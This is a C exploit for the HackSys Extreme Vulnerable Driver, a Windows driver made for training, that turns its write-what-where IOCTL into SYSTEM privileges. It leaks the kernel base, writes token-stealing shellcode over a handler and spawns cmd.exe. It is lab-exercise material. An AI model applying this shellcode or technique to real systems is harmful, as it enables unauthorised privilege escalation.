#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>

#include <windows.h>
#include <psapi.h>
#include <ntdef.h>
#include <winternl.h>
#include <shlwapi.h>

#define ARW_HELPER_OBJECTS 3
#define MAX_OBJECT_COUNT 65535

#define IOCTL(Function) CTL_CODE (FILE_DEVICE_UNKNOWN, Function, METHOD_NEITHER, FILE_ANY_ACCESS)

#define HEVD_IOCTL_ARBITRARY_WRITE IOCTL(0x802)
#define HEVD_IOCTL_DELETE_ARW_HELPER_OBJECT_NON_PAGED_POOL_NX IOCTL(0x81B)

/* Structure used by Write-What-Where */
typedef struct _WRITE_WHAT_WHERE
{
  PULONG_PTR What;
  PULONG_PTR Where;
} WRITE_WHAT_WHERE, *PWRITE_WHAT_WHERE;

/* typdef signature for ZwQuerySystemInformation */
typedef NTSTATUS (__stdcall *ZWQUERYSYSTEMINFORMATION)(
                  SYSTEM_INFORMATION_CLASS SystemInformationClass,
                  PVOID                    SystemInformation,
                  ULONG                    SystemInformationLength,
                  PULONG                   ReturnLength
);

/* Structures used by KernelGetModuleBase */
typedef struct _SYSTEM_MODULE_ENTRY
{
  HANDLE Section;
  PVOID MappedBase;
  PVOID ImageBase;
  ULONG ImageSize;
  ULONG Flags;
  USHORT LoadOrderIndex;
  USHORT InitOrderIndex;
  USHORT LoadCount;
  USHORT OffsetToFileName;
  UCHAR FullPathName[256];
} SYSTEM_MODULE_ENTRY, *PSYSTEM_MODULE_ENTRY;

typedef struct _SYSTEM_MODULE_INFORMATION
{
  ULONG Count;
  SYSTEM_MODULE_ENTRY Module[1];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

/* KernelGetModuleBase():
     Function used to obtain kernel module address */
PVOID KernelGetModuleBase(PCHAR pcModuleName)
{
  HANDLE hModule                                    = NULL;
  PVOID pSystemInfo                                 = NULL;
  PVOID pModule                                     = NULL;
  ZWQUERYSYSTEMINFORMATION ZwQuerySystemInformation = NULL;
  NTSTATUS status                                   = 0xc000009a; // STATUS_INSUFFICIENT_RESOURCES
  SYSTEM_INFORMATION_CLASS SystemModuleInformation  = 0x0B;
  ULONG SystemInfoSize                              = 0;
  
  hModule = LoadLibraryA("ntdll.dll");
  if (hModule == NULL)
  {
    printf("[-] Failed to load ntdll.dll\n");
    return NULL;
  }

  ZwQuerySystemInformation = (ZWQUERYSYSTEMINFORMATION)GetProcAddress(hModule, "ZwQuerySystemInformation");
  if (ZwQuerySystemInformation == NULL)
  {
    printf("[-] Failed to find ZwQuerySystemInformation within ntdll.dll");
    CloseHandle(hModule);
    return NULL;
  }

  /* Obtain the size of the requested information */
  status = ZwQuerySystemInformation(SystemModuleInformation,
                                    NULL,
                                    SystemInfoSize,
                                    &SystemInfoSize);

  if (SystemInfoSize == 0) {
    printf("[*] Failed to get size of SystemInformation\n");
    CloseHandle(hModule);
    return NULL;
  }

  pSystemInfo = (PSYSTEM_MODULE_INFORMATION)malloc(SystemInfoSize);
  if (pSystemInfo == NULL)
  {
    printf("[-] Failed to allocate buffer for SystemInformation\n");
    CloseHandle(hModule);
    return NULL;
  }
  memset(pSystemInfo, '\0', SystemInfoSize);

  /* Obtain the SystemModuleInformation */
  status = ZwQuerySystemInformation(SystemModuleInformation,
                                    pSystemInfo,
                                    SystemInfoSize,
                                    &SystemInfoSize);

  PSYSTEM_MODULE_ENTRY pSysModule = ((PSYSTEM_MODULE_INFORMATION)(pSystemInfo))->Module;
  for (unsigned long i = 0; i < ((PSYSTEM_MODULE_INFORMATION)(pSystemInfo))->Count; i++)
  {
    if (StrStrA(pSysModule[i].FullPathName, pcModuleName) != NULL)
    {
      pModule = pSysModule[i].ImageBase;
    }
  }

  if (hModule != NULL)
  {
    CloseHandle(hModule);
  }

  return pModule;
}

/* CheckWin():
     Simple function to check if we're running as SYSTEM */
int CheckWin(VOID)
{
  DWORD win = 0;
  DWORD dwLen = 0;
  CHAR *cUsername = NULL;

  GetUserNameA(NULL, &dwLen);

  if (dwLen > 0) {
    cUsername = (CHAR *)malloc(dwLen * sizeof(CHAR));
  } else {
    printf("[-] Failed to allocate buffer for username check\n");
    return -1;
  }

  GetUserNameA(cUsername, &dwLen);

  win = strcmp(cUsername, "SYSTEM");
  free(cUsername);

  return (win == 0) ? win : -1;
}

/* WriteBytes():
     This function triggers the Write-What-Where vulnerability */
void WriteBytes(HANDLE hHEVD, ULONG ulWhat, ULONG ulWhere)
{
  DWORD dwBytesReturned;
  WRITE_WHAT_WHERE www = { 0 };

  www.Where = (PULONG)ulWhere;
  www.What = &ulWhat;
  printf("\t[*] Writing 0x%p to 0x%p\n", *www.What, www.Where);

  DeviceIoControl(hHEVD,
                  HEVD_IOCTL_ARBITRARY_WRITE,
                  &www,
                  sizeof(WRITE_WHAT_WHERE),
                  NULL,
                  0x00,
                  &dwBytesReturned,
                  NULL);
  return;
}

/* Exploit():
     Arbitrary write */
int Exploit(HANDLE hHEVD)
{
  DWORD i                 = 0;
  DWORD dwShellcodeLength = 0;
  DWORD dwBytesReturned   = 0;
  ULONG target            = 0;
  ULONG ulRawBytes        = 0;
  PVOID pHEVDBase         = NULL;
  CHAR cRawBytes[60]      = { 0 };

  CHAR cShellcode[]=
  "\x90\x90\x90"                 // nops

  // sickle -p windows/x86/kernel_token_stealer -f c -m pinpoint
  "\x60"                         // pushal 
  "\x31\xc0"                     // xor eax, eax
  "\x64\x8b\x80\x24\x01\x00\x00" // mov eax, dword ptr fs:[eax + 0x124]
  "\x8b\x40\x50"                 // mov eax, dword ptr [eax + 0x50]
  "\x89\xc1"                     // mov ecx, eax
  "\xba\x04\x00\x00\x00"         // mov edx, 4
  "\x8b\x80\xb8\x00\x00\x00"     // mov eax, dword ptr [eax + 0xb8]
  "\x2d\xb8\x00\x00\x00"         // sub eax, 0xb8
  "\x39\x90\xb4\x00\x00\x00"     // cmp dword ptr [eax + 0xb4], edx
  "\x75\xed"                     // jne 0x1014
  "\x8b\x90\xf8\x00\x00\x00"     // mov edx, dword ptr [eax + 0xf8]
  "\x89\x91\xf8\x00\x00\x00"     // mov dword ptr [ecx + 0xf8], edx
  "\x61"                         // popal

  /* return code (sickle -a x86 -m asm_shell) */
  "\x31\xc0"                     // xor eax, eax
  "\xc2\x08\x00";                // ret 0x8

  dwShellcodeLength = 60;
  if ((dwShellcodeLength % 4) != 0)
  {
    printf("[-] Shellcode must by divisible by 4\n");
    return -1;
  }

  pHEVDBase = KernelGetModuleBase("HEVD");
  if (pHEVDBase == NULL)
  {
    printf("[-] Failed to obtain the base address of HEVD\n");
    return -1;
  }
  printf("[*] Obtained HEVD base address: 0x%p\n", pHEVDBase);

  target = (ULONG)pHEVDBase + 0x448f2;
  printf("[*] Overwriting memory @{DeleteArbitraryReadWriteHelperObjecNonPagedPoolNxIoctlHandler}\n");
 
  /* This is a quick for loop I whipped up to write our shellcode. The way this works is the buffer
     is converted into a little endian ASCII address (e.g 0x41424344 -> 0x44434241) then we convert
     the ASCII address to an unsigned long integer (4 bytes) to be written via the Write-What-Where
     vulnerability. Each iteration we increment the target address by 4 (32bit address) to point to
     the next address, we also increment the pointer to the shellcode array by 4 (we can only write
     4 bytes at a time). */
  for (i = 0; i < dwShellcodeLength; i += 4)
  {
    sprintf(cRawBytes, "0x%02x%02x%02x%02x", ((uint32_t)cShellcode[i+3] & 0xff),
                                             ((uint32_t)cShellcode[i+2] & 0xff),
                                             ((uint32_t)cShellcode[i+1] & 0xff),
                                             ((uint32_t)cShellcode[i+0] & 0xff));

    ulRawBytes = strtoul(cRawBytes, NULL, 16);
    WriteBytes(hHEVD, ulRawBytes, target);
    memset(cRawBytes, '\0', 60);
    target += 4;
  }

  printf("[+] Calling DeleteArbitraryReadWriteHelperObjecNonPagedPoolNx\n");
  DeviceIoControl(hHEVD,
                  HEVD_IOCTL_DELETE_ARW_HELPER_OBJECT_NON_PAGED_POOL_NX,
                  NULL,
                  0,
                  NULL,
                  0x00,
                  &dwBytesReturned,
                  NULL);

  return CheckWin();
}

int main()
{
  HANDLE hHEVD = NULL;
  hHEVD = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver",
                      (GENERIC_READ | GENERIC_WRITE),
                      0x00,
                      NULL,
                      OPEN_EXISTING,
                      FILE_ATTRIBUTE_NORMAL,
                      NULL);

  if (hHEVD == INVALID_HANDLE_VALUE)
  {
    printf("[-] Failed to get a handle on HackSysExtremeVulnerableDriver\n");
    return -1;
  }

  if (Exploit(hHEVD) == 0) {
    printf("[+] Exploitation successful, enjoy your shell!\n\n");
    system("cmd.exe");
  } else {
    printf("[-] Exploitation failed, run again\n");
    return -1;
  }

  if (hHEVD != INVALID_HANDLE_VALUE) {
    CloseHandle(hHEVD);
  }
}
